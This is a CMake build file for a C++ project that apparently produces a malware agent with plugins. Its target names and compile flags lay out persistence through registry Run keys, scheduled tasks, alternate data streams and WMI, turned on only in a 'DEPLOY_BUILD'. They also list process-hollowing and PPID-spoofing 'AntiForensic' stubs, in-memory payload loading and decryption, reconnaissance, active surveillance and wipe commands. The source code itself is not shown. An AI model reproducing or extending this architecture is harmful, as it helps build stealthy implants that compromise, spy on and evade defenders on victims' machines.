cmake_minimum_required(VERSION 3.10)
project(client)
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_POSITION_INDEPENDENT_CODE ON)
find_package(OpenSSL REQUIRED)
find_package(CURL REQUIRED)
include_directories(../include)

add_library(CommandCore STATIC
    ../src/CommandRegistry.cpp
    ../src/Globals.cpp
    ../src/HttpHeaderRandomizer.cpp
    ../src/RequestSigner.cpp)
set_target_properties(CommandCore PROPERTIES POSITION_INDEPENDENT_CODE ON)


add_library(FingerprintModule SHARED ../src/FingerprintModule.cpp ../src/Fingerprint.cpp)
add_library(CommandHandler SHARED ../src/CommandHandler.cpp)
target_link_libraries(CommandHandler CURL::libcurl CommandCore)
if(DEPLOY_BUILD)
    add_library(UpdateHandler SHARED ../src/UpdateHandler.cpp)
    add_library(DynamicDispatcher SHARED ../src/DynamicDispatcher.cpp)
endif()
add_library(PersistenceModule SHARED ../src/PersistenceModule.cpp)
if(DEPLOY_BUILD)
    target_compile_definitions(PersistenceModule PRIVATE PERSIST_RUN_HKCU=1 PERSIST_RUN_HKLM=1 PERSIST_TASK=1 PERSIST_ADS=1 PERSIST_WMI=1)
else()
    target_compile_definitions(PersistenceModule PRIVATE PERSIST_RUN_HKCU=0 PERSIST_RUN_HKLM=0 PERSIST_TASK=0 PERSIST_ADS=0 PERSIST_WMI=0)
endif()
add_library(ConfigModule SHARED ../src/ConfigModule.cpp)
add_library(KeyExchange SHARED ../src/KeyExchange.cpp)
target_link_libraries(KeyExchange OpenSSL::Crypto CURL::libcurl)

add_library(IPC SHARED ../src/IPCServer.cpp)

add_library(CmdSafeMode SHARED ../src/CommandSafeMode.cpp)
add_library(CmdDeepSleep SHARED ../src/CommandDeepSleep.cpp)
add_library(CmdWipe SHARED ../src/CommandWipe.cpp)
target_link_libraries(CmdWipe CommandCore)
target_link_libraries(CmdDeepSleep CommandCore)
target_link_libraries(CmdSafeMode CommandCore)

add_library(ProcessHollowingStub SHARED ../src/AntiForensic/ProcessHollowingStub.cpp)
target_link_libraries(ProcessHollowingStub CommandCore)
add_library(PPIDSpoofingStub SHARED ../src/AntiForensic/PPIDSpoofingStub.cpp)
target_link_libraries(PPIDSpoofingStub CommandCore)

add_library(ReconModule SHARED ../src/ReconModule.cpp)
target_link_libraries(ReconModule CURL::libcurl CommandCore OpenSSL::Crypto)

if(DEPLOY_BUILD)
    add_library(ReconAdvancedModule SHARED ../src/ReconAdvancedModule.cpp)
    target_link_libraries(ReconAdvancedModule CURL::libcurl CommandCore OpenSSL::Crypto)
endif()

add_library(ActiveSurveillanceModule SHARED ../src/ActiveSurveillanceModule.cpp)
target_link_libraries(ActiveSurveillanceModule CURL::libcurl CommandCore OpenSSL::Crypto)

add_executable(agent
    ../src/main.cpp
    ../src/Loader.cpp
    ../src/MemoryLoader.cpp
    ../src/PayloadDecryptor.cpp
    ../src/ConfigModule.cpp
    ../src/Fingerprint.cpp
    ../src/Crypto.cpp
    ../src/KeyExchange.cpp
    ../src/Wipe.cpp)
target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl CommandCore uuid)
target_compile_definitions(agent PRIVATE STATIC_AGENT)

install(TARGETS agent DESTINATION bin)
set(PLUGIN_TARGETS FingerprintModule CommandHandler KeyExchange PersistenceModule ConfigModule CmdSafeMode CmdDeepSleep CmdWipe IPC ProcessHollowingStub PPIDSpoofingStub ReconModule ActiveSurveillanceModule)
if(DEPLOY_BUILD)
    list(APPEND PLUGIN_TARGETS UpdateHandler ReconAdvancedModule DynamicDispatcher)
endif()
install(TARGETS ${PLUGIN_TARGETS} DESTINATION plugins)
